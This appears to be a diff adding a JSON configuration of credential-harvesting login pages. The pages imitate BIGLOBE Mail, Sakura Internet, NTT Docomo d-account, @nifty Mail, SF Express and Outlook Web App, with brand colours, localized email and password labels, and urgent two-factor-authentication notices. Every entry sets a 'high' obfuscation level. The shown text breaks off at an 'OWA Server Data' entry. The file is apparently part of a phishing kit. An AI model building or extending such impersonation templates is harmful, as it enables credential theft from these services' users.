@@ -1,0 +1,1090 @@
+[
+  {
+    "id": "biglobe_default",
+    "name": "BIGLOBE Mail",
+    "provider": "biglobe",
+    "type": "email-login",
+    "enabled": true,
+    "isDefault": false,
+    "theme": {
+      "primaryColor": "#FF9900",
+      "secondaryColor": "#FFCC66",
+      "backgroundColor": "#FFFFFF",
+      "textColor": "#333333",
+      "accentColor": "#FF6600"
+    },
+    "background": {
+      "type": "color",
+      "value": "#F5F5F5"
+    },
+    "logo": {
+      "text": "BIGLOBEメール",
+      "width": 200,
+      "height": 60
+    },
+    "layout": {
+      "containerWidth": "500px",
+      "formPosition": "center",
+      "showHeader": true,
+      "showFooter": true
+    },
+    "translations": {
+      "en": {
+        "title": "BIGLOBE Mail",
+        "emailLabel": "Email address or user ID",
+        "emailPlaceholder": "Enter your email",
+        "passwordLabel": "BIGLOBE password",
+        "passwordPlaceholder": "Enter your password",
+        "submitButton": "Login",
+        "forgotPassword": "Forgot your password?",
+        "rememberMe": "Keep me logged in",
+        "createAccount": "Create new account",
+        "notices": {
+          "twoFactorAuth": "Important notice regarding two-factor authentication settings"
+        },
+        "errorMessages": {
+          "invalidEmail": "Invalid email or user ID",
+          "invalidPassword": "Invalid password",
+          "accountLocked": "Account temporarily locked",
+          "serverError": "Server error. Please try again."
+        }
+      },
+      "ja": {
+        "title": "BIGLOBEメール",
+        "emailLabel": "メールアドレスまたはユーザID",
+        "emailPlaceholder": "メールアドレスを入力",
+        "passwordLabel": "BIGLOBEパスワード",
+        "passwordPlaceholder": "パスワードを入力",
+        "submitButton": "ログイン",
+        "forgotPassword": "パスワードをお忘れの方",
+        "rememberMe": "ログイン状態を保存する",
+        "createAccount": "新規登録",
+        "notices": {
+          "twoFactorAuth": "2要素認証設定についての重要なお知らせ"
+        },
+        "errorMessages": {
+          "invalidEmail": "メールアドレスまたはユーザIDが正しくありません",
+          "invalidPassword": "パスワードが正しくありません",
+          "accountLocked": "アカウントが一時的にロックされています",
+          "serverError": "サーバーエラーが発生しました。もう一度お試しください。"
+        }
+      },
+      "ko": {
+        "title": "BIGLOBE 메일",
+        "emailLabel": "이메일 주소 또는 사용자 ID",
+        "emailPlaceholder": "이메일을 입력하세요",
+        "passwordLabel": "BIGLOBE 비밀번호",
+        "passwordPlaceholder": "비밀번호를 입력하세요",
+        "submitButton": "로그인",
+        "forgotPassword": "비밀번호를 잊으셨나요?",
+        "rememberMe": "로그인 상태 유지",
+        "createAccount": "새 계정 만들기",
+        "notices": {
+          "twoFactorAuth": "2단계 인증 설정에 관한 중요 공지"
+        },
+        "errorMessages": {
+          "invalidEmail": "잘못된 이메일 또는 사용자 ID",
+          "invalidPassword": "잘못된 비밀번호",
+          "accountLocked": "계정이 일시적으로 잠겼습니다",
+          "serverError": "서버 오류. 다시 시도해주세요."
+        }
+      },
+      "de": {
+        "title": "BIGLOBE Mail",
+        "emailLabel": "E-Mail-Adresse oder Benutzer-ID",
+        "emailPlaceholder": "Geben Sie Ihre E-Mail ein",
+        "passwordLabel": "BIGLOBE Passwort",
+        "passwordPlaceholder": "Geben Sie Ihr Passwort ein",
+        "submitButton": "Anmelden",
+        "forgotPassword": "Passwort vergessen?",
+        "rememberMe": "Angemeldet bleiben",
+        "createAccount": "Neues Konto erstellen",
+        "notices": {
+          "twoFactorAuth": "Wichtiger Hinweis zu Zwei-Faktor-Authentifizierung"
+        },
+        "errorMessages": {
+          "invalidEmail": "Ungültige E-Mail oder Benutzer-ID",
+          "invalidPassword": "Ungültiges Passwort",
+          "accountLocked": "Konto vorübergehend gesperrt",
+          "serverError": "Serverfehler. Bitte versuchen Sie es erneut."
+        }
+      },
+      "es": {
+        "title": "BIGLOBE Mail",
+        "emailLabel": "Dirección de correo o ID de usuario",
+        "emailPlaceholder": "Ingrese su correo",
+        "passwordLabel": "Contraseña BIGLOBE",
+        "passwordPlaceholder": "Ingrese su contraseña",
+        "submitButton": "Iniciar sesión",
+        "forgotPassword": "¿Olvidó su contraseña?",
+        "rememberMe": "Mantenerme conectado",
+        "createAccount": "Crear nueva cuenta",
+        "notices": {
+          "twoFactorAuth": "Aviso importante sobre la configuración de autenticación de dos factores"
+        },
+        "errorMessages": {
+          "invalidEmail": "Correo o ID de usuario inválido",
+          "invalidPassword": "Contraseña inválida",
+          "accountLocked": "Cuenta bloqueada temporalmente",
+          "serverError": "Error del servidor. Por favor, inténtelo de nuevo."
+        }
+      }
+    },
+    "defaultLanguage": "ja",
+    "autoDetectLanguage": true,
+    "features": {
+      "showLogo": true,
+      "showNotices": true,
+      "showCaptcha": true,
+      "showRememberMe": true,
+      "showForgotPassword": true,
+      "showCreateAccount": false,
+      "showSoftKeyboard": true
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763114088637,
+    "createdBy": "system"
+  },
+  {
+    "id": "sakura_default",
+    "name": "SAKURA Internet",
+    "provider": "sakura",
+    "type": "email-login",
+    "enabled": true,
+    "isDefault": false,
+    "theme": {
+      "primaryColor": "#0066CC",
+      "secondaryColor": "#3399FF",
+      "backgroundColor": "#FFFFFF",
+      "textColor": "#333333",
+      "accentColor": "#0052A3"
+    },
+    "background": {
+      "type": "color",
+      "value": "#FFFFFF"
+    },
+    "logo": {
+      "text": "SAKURA internet",
+      "width": 200,
+      "height": 50
+    },
+    "layout": {
+      "containerWidth": "600px",
+      "formPosition": "center",
+      "showHeader": true,
+      "showFooter": true
+    },
+    "translations": {
+      "en": {
+        "title": "Sakura Internet Membership Authentication",
+        "emailLabel": "Member ID",
+        "emailPlaceholder": "Example: nnn12345",
+        "passwordLabel": "Password",
+        "passwordPlaceholder": "Enter password",
+        "submitButton": "Login",
+        "forgotPassword": "Forgot your membership ID?",
+        "rememberMe": "Stay logged in",
+        "createAccount": "New member registration",
+        "notices": {
+          "twoFactorAuth": "Important notice regarding two-factor authentication settings. As part of measures to prevent unauthorized access, from December 3, 2025, two-factor authentication will be required for member authentication."
+        },
+        "errorMessages": {
+          "invalidEmail": "Invalid member ID",
+          "invalidPassword": "Invalid password",
+          "accountLocked": "Account locked",
+          "serverError": "Error occurred"
+        }
+      },
+      "ja": {
+        "title": "Sakura Internet会員認証",
+        "emailLabel": "会員ID",
+        "emailPlaceholder": "例: nnn12345",
+        "passwordLabel": "パスワード",
+        "passwordPlaceholder": "パスワード入力",
+        "submitButton": "ログイン",
+        "forgotPassword": "会員IDをお忘れの方",
+        "rememberMe": "ログインしたままにする",
+        "createAccount": "新規会員登録",
+        "notices": {
+          "twoFactorAuth": "<2要素認証設定についての重要なお知らせ> 2025年12月3日より不正アクセス対策の一環として、会員認証の際に2要素認証設定が必須となります。"
+        },
+        "errorMessages": {
+          "invalidEmail": "会員IDが正しくありません",
+          "invalidPassword": "パスワードが正しくありません",
+          "accountLocked": "アカウントがロックされています",
+          "serverError": "エラーが発生しました"
+        }
+      },
+      "ko": {
+        "title": "Sakura Internet 회원 인증",
+        "emailLabel": "회원 ID",
+        "emailPlaceholder": "예: nnn12345",
+        "passwordLabel": "비밀번호",
+        "passwordPlaceholder": "비밀번호 입력",
+        "submitButton": "로그인",
+        "forgotPassword": "회원 ID를 잊으셨나요?",
+        "rememberMe": "로그인 상태 유지",
+        "createAccount": "신규 회원 가입",
+        "notices": {
+          "twoFactorAuth": "2단계 인증 설정에 관한 중요 공지. 무단 액세스 방지 조치의 일환으로 2025년 12월 3일부터 회원 인증 시 2단계 인증 설정이 필요합니다."
+        },
+        "errorMessages": {
+          "invalidEmail": "잘못된 회원 ID",
+          "invalidPassword": "잘못된 비밀번호",
+          "accountLocked": "계정이 잠겼습니다",
+          "serverError": "오류가 발생했습니다"
+        }
+      },
+      "de": {
+        "title": "Sakura Internet Mitgliederauthentifizierung",
+        "emailLabel": "Mitglieds-ID",
+        "emailPlaceholder": "Beispiel: nnn12345",
+        "passwordLabel": "Passwort",
+        "passwordPlaceholder": "Passwort eingeben",
+        "submitButton": "Anmelden",
+        "forgotPassword": "Mitglieds-ID vergessen?",
+        "rememberMe": "Angemeldet bleiben",
+        "createAccount": "Neue Mitgliedsregistrierung",
+        "notices": {
+          "twoFactorAuth": "Wichtiger Hinweis zu Zwei-Faktor-Authentifizierung. Als Teil der Maßnahmen zur Verhinderung unbefugten Zugriffs wird ab dem 3. Dezember 2025 eine Zwei-Faktor-Authentifizierung für die Mitgliederauthentifizierung erforderlich sein."
+        },
+        "errorMessages": {
+          "invalidEmail": "Ungültige Mitglieds-ID",
+          "invalidPassword": "Ungültiges Passwort",
+          "accountLocked": "Konto gesperrt",
+          "serverError": "Fehler aufgetreten"
+        }
+      },
+      "es": {
+        "title": "Autenticación de Miembro Sakura Internet",
+        "emailLabel": "ID de Miembro",
+        "emailPlaceholder": "Ejemplo: nnn12345",
+        "passwordLabel": "Contraseña",
+        "passwordPlaceholder": "Ingresar contraseña",
+        "submitButton": "Iniciar sesión",
+        "forgotPassword": "¿Olvidó su ID de miembro?",
+        "rememberMe": "Mantener sesión iniciada",
+        "createAccount": "Registro de nuevo miembro",
+        "notices": {
+          "twoFactorAuth": "Aviso importante sobre la configuración de autenticación de dos factores. Como parte de las medidas para prevenir el acceso no autorizado, a partir del 3 de diciembre de 2025, se requerirá autenticación de dos factores para la autenticación de miembros."
+        },
+        "errorMessages": {
+          "invalidEmail": "ID de miembro inválido",
+          "invalidPassword": "Contraseña inválida",
+          "accountLocked": "Cuenta bloqueada",
+          "serverError": "Ocurrió un error"
+        }
+      }
+    },
+    "defaultLanguage": "ja",
+    "autoDetectLanguage": true,
+    "features": {
+      "showLogo": true,
+      "showNotices": true,
+      "showCaptcha": false,
+      "showRememberMe": true,
+      "showForgotPassword": true,
+      "showCreateAccount": true,
+      "showSoftKeyboard": false
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763113578205,
+    "createdBy": "system"
+  },
+  {
+    "id": "docomo_default",
+    "name": "NTT Docomo d-account",
+    "provider": "docomo",
+    "type": "email-login",
+    "enabled": true,
+    "isDefault": false,
+    "theme": {
+      "primaryColor": "#CC0033",
+      "secondaryColor": "#FF3366",
+      "backgroundColor": "#FFFFFF",
+      "textColor": "#333333",
+      "accentColor": "#990033"
+    },
+    "background": {
+      "type": "color",
+      "value": "#FFFFFF"
+    },
+    "logo": {
+      "text": "dアカウント",
+      "width": 180,
+      "height": 50
+    },
+    "layout": {
+      "containerWidth": "500px",
+      "formPosition": "center",
+      "showHeader": true,
+      "showFooter": true
+    },
+    "translations": {
+      "en": {
+        "title": "d Account",
+        "emailLabel": "d Account ID",
+        "emailPlaceholder": "Email address or any ID",
+        "passwordLabel": "Password",
+        "passwordPlaceholder": "Enter password",
+        "submitButton": "Next",
+        "forgotPassword": "If you don't know your d account",
+        "rememberMe": "Stay logged in",
+        "createAccount": "Create a d account",
+        "errorMessages": {
+          "invalidEmail": "Invalid d Account ID",
+          "invalidPassword": "Invalid password",
+          "accountLocked": "Account locked",
+          "serverError": "Error occurred"
+        }
+      },
+      "ja": {
+        "title": "dアカウント",
+        "emailLabel": "dアカウントID",
+        "emailPlaceholder": "メールアドレスまたは任意のID",
+        "passwordLabel": "パスワード",
+        "passwordPlaceholder": "パスワード入力",
+        "submitButton": "次へ",
+        "forgotPassword": "dアカウントがわからない方",
+        "rememberMe": "ログインしたままにする",
+        "createAccount": "dアカウントを作成",
+        "notices": {
+          "loginNote": "ログインについての注意事項をご確認ください。"
+        },
+        "errorMessages": {
+          "invalidEmail": "dアカウントIDが正しくありません",
+          "invalidPassword": "パスワードが正しくありません",
+          "accountLocked": "アカウントがロックされています",
+          "serverError": "エラーが発生しました"
+        }
+      },
+      "ko": {
+        "title": "d 계정",
+        "emailLabel": "d 계정 ID",
+        "emailPlaceholder": "이메일 주소 또는 임의 ID",
+        "passwordLabel": "비밀번호",
+        "passwordPlaceholder": "비밀번호 입력",
+        "submitButton": "다음",
+        "forgotPassword": "d 계정을 모르시나요?",
+        "rememberMe": "로그인 상태 유지",
+        "createAccount": "d 계정 만들기",
+        "errorMessages": {
+          "invalidEmail": "잘못된 d 계정 ID",
+          "invalidPassword": "잘못된 비밀번호",
+          "accountLocked": "계정이 잠겼습니다",
+          "serverError": "오류가 발생했습니다"
+        }
+      },
+      "de": {
+        "title": "d Account",
+        "emailLabel": "d Account ID",
+        "emailPlaceholder": "E-Mail-Adresse oder beliebige ID",
+        "passwordLabel": "Passwort",
+        "passwordPlaceholder": "Passwort eingeben",
+        "submitButton": "Weiter",
+        "forgotPassword": "Wenn Sie Ihren d Account nicht kennen",
+        "rememberMe": "Angemeldet bleiben",
+        "createAccount": "d Account erstellen",
+        "errorMessages": {
+          "invalidEmail": "Ungültige d Account ID",
+          "invalidPassword": "Ungültiges Passwort",
+          "accountLocked": "Konto gesperrt",
+          "serverError": "Fehler aufgetreten"
+        }
+      },
+      "es": {
+        "title": "Cuenta d",
+        "emailLabel": "ID de cuenta d",
+        "emailPlaceholder": "Dirección de correo o cualquier ID",
+        "passwordLabel": "Contraseña",
+        "passwordPlaceholder": "Ingresar contraseña",
+        "submitButton": "Siguiente",
+        "forgotPassword": "Si no conoce su cuenta d",
+        "rememberMe": "Mantener sesión iniciada",
+        "createAccount": "Crear cuenta d",
+        "errorMessages": {
+          "invalidEmail": "ID de cuenta d inválido",
+          "invalidPassword": "Contraseña inválida",
+          "accountLocked": "Cuenta bloqueada",
+          "serverError": "Ocurrió un error"
+        }
+      }
+    },
+    "defaultLanguage": "ja",
+    "autoDetectLanguage": true,
+    "features": {
+      "showLogo": true,
+      "showNotices": true,
+      "showCaptcha": false,
+      "showRememberMe": true,
+      "showForgotPassword": true,
+      "showCreateAccount": true,
+      "showSoftKeyboard": false
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763113578205,
+    "createdBy": "system"
+  },
+  {
+    "id": "nifty_default",
+    "name": "@nifty メール",
+    "provider": "nifty",
+    "type": "email-login",
+    "enabled": true,
+    "isDefault": true,
+    "theme": {
+      "primaryColor": "#FFCC00",
+      "secondaryColor": "#FFDD55",
+      "backgroundColor": "#FFFFFF",
+      "textColor": "#333333",
+      "accentColor": "#FF9900"
+    },
+    "background": {
+      "type": "color",
+      "value": "#F0F0F0"
+    },
+    "logo": {
+      "text": "@nifty メール",
+      "width": 180,
+      "height": 50
+    },
+    "layout": {
+      "containerWidth": "480px",
+      "formPosition": "center",
+      "showHeader": true,
+      "showFooter": true
+    },
+    "translations": {
+      "en": {
+        "title": "@nifty Mail",
+        "emailLabel": "@nifty ID or @nifty username",
+        "emailPlaceholder": "Enter your ID",
+        "passwordLabel": "Password",
+        "passwordPlaceholder": "Enter password",
+        "submitButton": "Enter your password",
+        "forgotPassword": "If you don't know your @nifty ID or @nifty username",
+        "rememberMe": "Stay logged in (uncheck this if using a shared computer)",
+        "notices": {
+          "mailServices": "Other @nifty mail services are available here"
+        },
+        "errorMessages": {
+          "invalidEmail": "Invalid @nifty ID",
+          "invalidPassword": "Invalid password",
+          "accountLocked": "Account locked",
+          "serverError": "Error occurred"
+        }
+      },
+      "ja": {
+        "title": "@niftyメール",
+        "emailLabel": "@nifty IDまたは@niftyユーザー名",
+        "emailPlaceholder": "IDを入力",
+        "passwordLabel": "パスワード",
+        "passwordPlaceholder": "パスワード入力",
+        "submitButton": "パスワード入力へ",
+        "forgotPassword": "@nifty IDまたは@niftyユーザー名がわからない場合",
+        "rememberMe": "ログインしたままにする（共用のパソコンではチェックを外してください）",
+        "notices": {
+          "mailServices": "@niftyメールの他サービスはこちら"
+        },
+        "errorMessages": {
+          "invalidEmail": "@nifty IDが正しくありません",
+          "invalidPassword": "パスワードが正しくありません",
+          "accountLocked": "アカウントがロックされています",
+          "serverError": "エラーが発生しました"
+        }
+      },
+      "ko": {
+        "title": "@nifty 메일",
+        "emailLabel": "@nifty ID 또는 @nifty 사용자 이름",
+        "emailPlaceholder": "ID를 입력하세요",
+        "passwordLabel": "비밀번호",
+        "passwordPlaceholder": "비밀번호 입력",
+        "submitButton": "비밀번호 입력하기",
+        "forgotPassword": "@nifty ID 또는 @nifty 사용자 이름을 모르시나요?",
+        "rememberMe": "로그인 상태 유지 (공용 컴퓨터에서는 체크 해제하세요)",
+        "notices": {
+          "mailServices": "기타 @nifty 메일 서비스는 여기"
+        },
+        "errorMessages": {
+          "invalidEmail": "잘못된 @nifty ID",
+          "invalidPassword": "잘못된 비밀번호",
+          "accountLocked": "계정이 잠겼습니다",
+          "serverError": "오류가 발생했습니다"
+        }
+      },
+      "de": {
+        "title": "@nifty Mail",
+        "emailLabel": "@nifty ID oder @nifty Benutzername",
+        "emailPlaceholder": "Geben Sie Ihre ID ein",
+        "passwordLabel": "Passwort",
+        "passwordPlaceholder": "Passwort eingeben",
+        "submitButton": "Passwort eingeben",
+        "forgotPassword": "Wenn Sie Ihre @nifty ID oder @nifty Benutzername nicht kennen",
+        "rememberMe": "Angemeldet bleiben (deaktivieren Sie dies bei Verwendung eines gemeinsam genutzten Computers)",
+        "notices": {
+          "mailServices": "Andere @nifty Mail-Dienste sind hier verfügbar"
+        },
+        "errorMessages": {
+          "invalidEmail": "Ungültige @nifty ID",
+          "invalidPassword": "Ungültiges Passwort",
+          "accountLocked": "Konto gesperrt",
+          "serverError": "Fehler aufgetreten"
+        }
+      },
+      "es": {
+        "title": "@nifty Mail",
+        "emailLabel": "ID de @nifty o nombre de usuario de @nifty",
+        "emailPlaceholder": "Ingrese su ID",
+        "passwordLabel": "Contraseña",
+        "passwordPlaceholder": "Ingresar contraseña",
+        "submitButton": "Ingresar contraseña",
+        "forgotPassword": "Si no conoce su ID de @nifty o nombre de usuario de @nifty",
+        "rememberMe": "Mantener sesión iniciada (desmarque esto si usa una computadora compartida)",
+        "notices": {
+          "mailServices": "Otros servicios de correo de @nifty están disponibles aquí"
+        },
+        "errorMessages": {
+          "invalidEmail": "ID de @nifty inválido",
+          "invalidPassword": "Contraseña inválida",
+          "accountLocked": "Cuenta bloqueada",
+          "serverError": "Ocurrió un error"
+        }
+      }
+    },
+    "defaultLanguage": "ja",
+    "autoDetectLanguage": false,
+    "features": {
+      "showLogo": true,
+      "showNotices": true,
+      "showCaptcha": false,
+      "showRememberMe": true,
+      "showForgotPassword": true,
+      "showCreateAccount": false,
+      "showSoftKeyboard": false
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763114374987,
+    "createdBy": "system"
+  },
+  {
+    "id": "sfexpress_default",
+    "name": "SF Express",
+    "provider": "sfexpress",
+    "type": "email-login",
+    "enabled": true,
+    "isDefault": false,
+    "theme": {
+      "primaryColor": "#DC2626",
+      "secondaryColor": "#EF4444",
+      "backgroundColor": "#FFFFFF",
+      "textColor": "#1F2937",
+      "accentColor": "#B91C1C"
+    },
+    "background": {
+      "type": "image",
+      "value": "/images/sf-warehouse-bg.png",
+      "opacity": 1
+    },
+    "logo": {
+      "text": "SF Express",
+      "width": 200,
+      "height": 60
+    },
+    "layout": {
+      "containerWidth": "1200px",
+      "formPosition": "right",
+      "showHeader": true,
+      "showFooter": true
+    },
+    "translations": {
+      "en": {
+        "title": "SF Express Login",
+        "emailLabel": "Email Address",
+        "emailPlaceholder": "Please enter email address",
+        "passwordLabel": "Password",
+        "passwordPlaceholder": "Please enter password",
+        "submitButton": "Login",
+        "forgotPassword": "Password Reset",
+        "rememberMe": "Remember me",
+        "createAccount": "Register Now",
+        "termsOfService": "Terms of Service",
+        "privacyPolicy": "Privacy Policy",
+        "errorMessages": {
+          "invalidEmail": "Please enter a valid email address",
+          "invalidPassword": "Password is required",
+          "accountLocked": "Account is temporarily locked",
+          "serverError": "Login failed. Please try again."
+        },
+        "notices": {
+          "twoFactorAuth": "Two-factor authentication enabled",
+          "maintenanceNotice": "System maintenance scheduled",
+          "loginNote": "Secure login powered by SF Express",
+          "mailServices": "International shipping and logistics services"
+        }
+      },
+      "ja": {
+        "title": "SF Express ログイン",
+        "emailLabel": "メールアドレス",
+        "emailPlaceholder": "メールアドレスを入力してください",
+        "passwordLabel": "パスワード",
+        "passwordPlaceholder": "パスワードを入力してください",
+        "submitButton": "ログイン",
+        "forgotPassword": "パスワードリセット",
+        "rememberMe": "ログイン状態を保持",
+        "createAccount": "今すぐ登録",
+        "termsOfService": "利用規約",
+        "privacyPolicy": "個人情報の取り扱いについて",
+        "errorMessages": {
+          "invalidEmail": "有効なメールアドレスを入力してください",
+          "invalidPassword": "パスワードを入力してください",
+          "accountLocked": "アカウントは一時的にロックされています",
+          "serverError": "ログインに失敗しました。もう一度お試しください。"
+        },
+        "notices": {
+          "twoFactorAuth": "二段階認証が有効です",
+          "maintenanceNotice": "システムメンテナンス予定",
+          "loginNote": "順豊速運による安全なログイン",
+          "mailServices": "国際配送・物流サービス"
+        }
+      },
+      "ko": {
+        "title": "SF Express 로그인",
+        "emailLabel": "이메일 주소",
+        "emailPlaceholder": "이메일 주소를 입력하세요",
+        "passwordLabel": "비밀번호",
+        "passwordPlaceholder": "비밀번호를 입력하세요",
+        "submitButton": "로그인",
+        "forgotPassword": "비밀번호 재설정",
+        "rememberMe": "로그인 상태 유지",
+        "createAccount": "지금 등록",
+        "termsOfService": "이용약관",
+        "privacyPolicy": "개인정보 처리방침",
+        "errorMessages": {
+          "invalidEmail": "유효한 이메일 주소를 입력하세요",
+          "invalidPassword": "비밀번호를 입력하세요",
+          "accountLocked": "계정이 일시적으로 잠겼습니다",
+          "serverError": "로그인에 실패했습니다. 다시 시도해주세요."
+        },
+        "notices": {
+          "twoFactorAuth": "2단계 인증 활성화됨",
+          "maintenanceNotice": "시스템 유지보수 예정",
+          "loginNote": "SF Express의 안전한 로그인",
+          "mailServices": "국제 배송 및 물류 서비스"
+        }
+      },
+      "de": {
+        "title": "SF Express Anmeldung",
+        "emailLabel": "E-Mail-Adresse",
+        "emailPlaceholder": "Bitte E-Mail-Adresse eingeben",
+        "passwordLabel": "Passwort",
+        "passwordPlaceholder": "Bitte Passwort eingeben",
+        "submitButton": "Anmelden",
+        "forgotPassword": "Passwort zurücksetzen",
+        "rememberMe": "Angemeldet bleiben",
+        "createAccount": "Jetzt registrieren",
+        "termsOfService": "Nutzungsbedingungen",
+        "privacyPolicy": "Datenschutzrichtlinie",
+        "errorMessages": {
+          "invalidEmail": "Bitte geben Sie eine gültige E-Mail-Adresse ein",
+          "invalidPassword": "Passwort ist erforderlich",
+          "accountLocked": "Konto ist vorübergehend gesperrt",
+          "serverError": "Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut."
+        },
+        "notices": {
+          "twoFactorAuth": "Zwei-Faktor-Authentifizierung aktiviert",
+          "maintenanceNotice": "Systemwartung geplant",
+          "loginNote": "Sichere Anmeldung von SF Express",
+          "mailServices": "Internationale Versand- und Logistikdienste"
+        }
+      },
+      "es": {
+        "title": "Inicio de sesión SF Express",
+        "emailLabel": "Dirección de correo",
+        "emailPlaceholder": "Por favor ingrese dirección de correo",
+        "passwordLabel": "Contraseña",
+        "passwordPlaceholder": "Por favor ingrese contraseña",
+        "submitButton": "Iniciar sesión",
+        "forgotPassword": "Restablecer contraseña",
+        "rememberMe": "Recordarme",
+        "createAccount": "Registrarse ahora",
+        "termsOfService": "Términos de servicio",
+        "privacyPolicy": "Política de privacidad",
+        "errorMessages": {
+          "invalidEmail": "Por favor ingrese una dirección de correo válida",
+          "invalidPassword": "La contraseña es obligatoria",
+          "accountLocked": "La cuenta está temporalmente bloqueada",
+          "serverError": "Error al iniciar sesión. Por favor intente de nuevo."
+        },
+        "notices": {
+          "twoFactorAuth": "Autenticación de dos factores habilitada",
+          "maintenanceNotice": "Mantenimiento del sistema programado",
+          "loginNote": "Inicio de sesión seguro de SF Express",
+          "mailServices": "Servicios internacionales de envío y logística"
+        }
+      }
+    },
+    "defaultLanguage": "en",
+    "autoDetectLanguage": true,
+    "features": {
+      "showLogo": true,
+      "showNotices": true,
+      "showCaptcha": false,
+      "showRememberMe": true,
+      "showForgotPassword": true,
+      "showCreateAccount": true,
+      "showSoftKeyboard": false
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763114374977,
+    "createdBy": "system"
+  },
+  {
+    "id": "outlook_default",
+    "name": "Outlook Web App",
+    "provider": "outlook",
+    "type": "email-login",
+    "enabled": true,
+    "isDefault": false,
+    "theme": {
+      "primaryColor": "#0078d4",
+      "secondaryColor": "#106ebe",
+      "backgroundColor": "#FFFFFF",
+      "textColor": "#323130",
+      "accentColor": "#005a9e"
+    },
+    "background": {
+      "type": "color",
+      "value": "#f0f0f0"
+    },
+    "logo": {
+      "text": "Outlook Web App",
+      "width": 200,
+      "height": 60
+    },
+    "layout": {
+      "containerWidth": "100%",
+      "formPosition": "center",
+      "showHeader": false,
+      "showFooter": false
+    },
+    "translations": {
+      "en": {
+        "title": "Outlook Web App",
+        "emailLabel": "User name",
+        "emailPlaceholder": "someone@example.com",
+        "passwordLabel": "Password",
+        "passwordPlaceholder": "Password",
+        "submitButton": "sign in",
+        "forgotPassword": "Can't access your account?",
+        "rememberMe": "Keep me signed in",
+        "createAccount": "Create one!",
+        "termsOfService": "Terms of use",
+        "privacyPolicy": "Privacy and cookies",
+        "errorMessages": {
+          "invalidEmail": "Please enter your email address",
+          "invalidPassword": "Please enter your password",
+          "accountLocked": "Your account has been locked",
+          "serverError": "Sign in failed. Please try again."
+        },
+        "notices": {
+          "signInOptions": "Sign-in options",
+          "maintenanceNotice": "Scheduled maintenance",
+          "loginNote": "Sign in to access your mailbox",
+          "mailServices": "Microsoft Office 365"
+        }
+      },
+      "ja": {
+        "title": "Outlook Web App",
+        "emailLabel": "ユーザー名",
+        "emailPlaceholder": "someone@example.com",
+        "passwordLabel": "パスワード",
+        "passwordPlaceholder": "パスワード",
+        "submitButton": "サインイン",
+        "forgotPassword": "アカウントにアクセスできませんか?",
+        "rememberMe": "サインインしたままにする",
+        "createAccount": "作成",
+        "termsOfService": "利用規約",
+        "privacyPolicy": "プライバシーと Cookie",
+        "errorMessages": {
+          "invalidEmail": "メールアドレスを入力してください",
+          "invalidPassword": "パスワードを入力してください",
+          "accountLocked": "アカウントがロックされています",
+          "serverError": "サインインに失敗しました。もう一度お試しください。"
+        },
+        "notices": {
+          "signInOptions": "サインイン オプション",
+          "maintenanceNotice": "メンテナンス予定",
+          "loginNote": "メールボックスにアクセスするにはサインインしてください",
+          "mailServices": "Microsoft Office 365"
+        }
+      },
+      "ko": {
+        "title": "Outlook Web App",
+        "emailLabel": "사용자 이름",
+        "emailPlaceholder": "someone@example.com",
+        "passwordLabel": "암호",
+        "passwordPlaceholder": "암호",
+        "submitButton": "로그인",
+        "forgotPassword": "계정에 액세스할 수 없나요?",
+        "rememberMe": "로그인 상태 유지",
+        "createAccount": "만들기",
+        "termsOfService": "사용 약관",
+        "privacyPolicy": "개인 정보 및 쿠키",
+        "errorMessages": {
+          "invalidEmail": "이메일 주소를 입력하세요",
+          "invalidPassword": "암호를 입력하세요",
+          "accountLocked": "계정이 잠겼습니다",
+          "serverError": "로그인에 실패했습니다. 다시 시도하세요."
+        },
+        "notices": {
+          "signInOptions": "로그인 옵션",
+          "maintenanceNotice": "예정된 유지 관리",
+          "loginNote": "사서함에 액세스하려면 로그인하세요",
+          "mailServices": "Microsoft Office 365"
+        }
+      },
+      "de": {
+        "title": "Outlook Web App",
+        "emailLabel": "Benutzername",
+        "emailPlaceholder": "jemand@example.com",
+        "passwordLabel": "Kennwort",
+        "passwordPlaceholder": "Kennwort",
+        "submitButton": "Anmelden",
+        "forgotPassword": "Können Sie nicht auf Ihr Konto zugreifen?",
+        "rememberMe": "Angemeldet bleiben",
+        "createAccount": "Erstellen!",
+        "termsOfService": "Nutzungsbedingungen",
+        "privacyPolicy": "Datenschutz und Cookies",
+        "errorMessages": {
+          "invalidEmail": "Bitte geben Sie Ihre E-Mail-Adresse ein",
+          "invalidPassword": "Bitte geben Sie Ihr Kennwort ein",
+          "accountLocked": "Ihr Konto wurde gesperrt",
+          "serverError": "Anmeldung fehlgeschlagen. Bitte versuchen Sie es erneut."
+        },
+        "notices": {
+          "signInOptions": "Anmeldeoptionen",
+          "maintenanceNotice": "Geplante Wartung",
+          "loginNote": "Melden Sie sich an, um auf Ihr Postfach zuzugreifen",
+          "mailServices": "Microsoft Office 365"
+        }
+      },
+      "es": {
+        "title": "Outlook Web App",
+        "emailLabel": "Nombre de usuario",
+        "emailPlaceholder": "alguien@example.com",
+        "passwordLabel": "Contraseña",
+        "passwordPlaceholder": "Contraseña",
+        "submitButton": "iniciar sesión",
+        "forgotPassword": "¿No puede acceder a su cuenta?",
+        "rememberMe": "Mantener la sesión iniciada",
+        "createAccount": "¡Crear una!",
+        "termsOfService": "Términos de uso",
+        "privacyPolicy": "Privacidad y cookies",
+        "errorMessages": {
+          "invalidEmail": "Ingrese su dirección de correo electrónico",
+          "invalidPassword": "Ingrese su contraseña",
+          "accountLocked": "Su cuenta ha sido bloqueada",
+          "serverError": "Error al iniciar sesión. Inténtelo de nuevo."
+        },
+        "notices": {
+          "signInOptions": "Opciones de inicio de sesión",
+          "maintenanceNotice": "Mantenimiento programado",
+          "loginNote": "Inicie sesión para acceder a su buzón",
+          "mailServices": "Microsoft Office 365"
+        }
+      }
+    },
+    "defaultLanguage": "en",
+    "autoDetectLanguage": true,
+    "features": {
+      "showLogo": true,
+      "showNotices": false,
+      "showCaptcha": false,
+      "showRememberMe": false,
+      "showForgotPassword": true,
+      "showCreateAccount": true,
+      "showSoftKeyboard": false
+    },
+    "obfuscationLevel": "high",
+    "createdAt": 1763113578205,
+    "updatedAt": 1763113578205,
+    "createdBy": "system"
+  },
+  {
+    "id": "owaserver_default",
+    "name": "OWA Server Data",
+    "provider": "owaserver",
